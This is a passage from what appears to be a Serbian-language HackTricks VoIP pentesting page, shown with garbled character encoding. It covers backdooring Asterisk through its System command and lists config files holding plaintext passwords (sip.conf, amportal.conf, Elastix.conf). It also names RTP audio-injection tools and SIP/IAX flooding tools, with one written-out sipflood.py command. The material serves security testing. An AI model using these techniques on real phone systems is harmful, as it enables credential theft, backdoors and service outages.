Ako server **onemoguÄ‡ava koriÅ¡Ä‡enje odreÄ‘enih karaktera** u **`System`** komandi (kao Å¡to je sluÄaj sa Elastix-om), proverite da li veb server omoguÄ‡ava **kreiranje fajlova unutar sistema** (kao Å¡to je sluÄaj sa Elastix-om ili trixbox-om) i koristite to da biste **kreirali skriptu za zadnja vrata** i zatim koristite **`System`** da biste **izvrÅ¡ili** tu **skriptu**.
{% endhint %}

#### Interesantni lokalni fajlovi i dozvole

* **`sip.conf`** -> SadrÅ¾i lozinke SIP korisnika.
* Ako **Asterisk server radi kao root**, moÅ¾ete kompromitovati root.
* **mysql root korisnik** moÅ¾da **nema lozinku**.
* Ovo se moÅ¾e iskoristiti za kreiranje novog mysql korisnika kao zadnja vrata.
* **`FreePBX`**
* **`amportal.conf`** -> SadrÅ¾i lozinku administratora veb panela (FreePBX).
* **`FreePBX.conf`** -> SadrÅ¾i lozinku korisnika FreePBXuser koji se koristi za pristup bazi podataka.
* Ovo se moÅ¾e iskoristiti za kreiranje novog mysql korisnika kao zadnja vrata.
* **`Elastix`**
* **`Elastix.conf`** -> SadrÅ¾i nekoliko lozinki u Äistom tekstu, kao Å¡to su mysql root lozinka, IMAPd lozinka, web admin lozinka.
* **Nekoliko foldera** Ä‡e pripadati kompromitovanom asterisk korisniku (ako ne radi kao root). Ovaj korisnik moÅ¾e Äitati prethodne fajlove i takoÄ‘e kontroliÅ¡e konfiguraciju, pa moÅ¾e naterati Asterisk da uÄita druge zadnje vrata binarne datoteke prilikom izvrÅ¡avanja.

### RTP Injekcija

MoguÄ‡e je ubaciti **`.wav`** fajl u konverzacije koristeÄ‡i alate kao Å¡to su **`rtpinsertsound`** (`sudo apt install rtpinsertsound`) i **`rtpmixsound`** (`sudo apt install rtpmixsound`).

Ili moÅ¾ete koristiti skripte sa [http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/) da **skenirate konverzacije** (**`rtpscan.pl`**), poÅ¡aljete `.wav` fajl u konverzaciju (**`rtpsend.pl`**) i ubacite buku u konverzaciju (**`rtpflood.pl`**).

### DoS

Postoji nekoliko naÄina za pokuÅ¡aj DoS-a na VoIP serverima.

* **`sipflood.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**: **_**SipFlood**_ Å¡alje neograniÄene poruke cilju
* `python3 sipflood.py -i 10.10.0.10 -r 5080 -m invite -v`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/): DoS IAX protokola koji koristi Asterisk
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt): Alat za izvoÄ‘enje SIP/SDP INVITE poruka preplavljivanjem preko UDP/IP.
* [**rtpflood**](https://www.kali.org/tools/rtpflood/): Slanje nekoliko ispravnih RTP paketa. Potrebno je znati koje RTP portove koristi (prvo snifirajte).
* [**SIPp**](https://github.com/SIPp/sipp): OmoguÄ‡ava analizu i generisanje SIP saobraÄ‡aja, pa se moÅ¾e koristiti i za DoS.
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak): SIP Å¡vajcarski noÅ¾iÄ‡. MoÅ¾e se koristiti i za izvoÄ‘enje SIP napada.
* Fuzzeri: [**protos-sip**](https://www.kali.org/tools/protos-sip/), [**voiper**](https://github.com/gremwell/voiper).
* **`sipsend.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** SIPSend nam omoguÄ‡ava slanje **prilagoÄ‘ene SIP poruke** i analizu odgovora.
* **`wssend.py`** iz [**sippts**](https://github.com/Pepelux/sippts)**:** WsSend nam omoguÄ‡ava slanje prilagoÄ‘ene SIP poruke preko WebSockets-a i analizu odgovora.

### OS Ranjivosti

NajlakÅ¡i naÄin za instaliranje softvera kao Å¡to je Asterisk je preuzimanje **OS distribucije** u kojoj je veÄ‡ instaliran, kao Å¡to su: **FreePBX, Elastix, Trixbox**... Problem sa njima je Å¡to kada jednom poÄnu da rade, sistem administratori ih moÅ¾da **neÄ‡e aÅ¾urirati ponovo** i sa vremenom Ä‡e biti otkrivene **ranjivosti**.

## Reference

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **oglaÅ¡avanje vaÅ¡e kompanije u HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, pogledajte [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
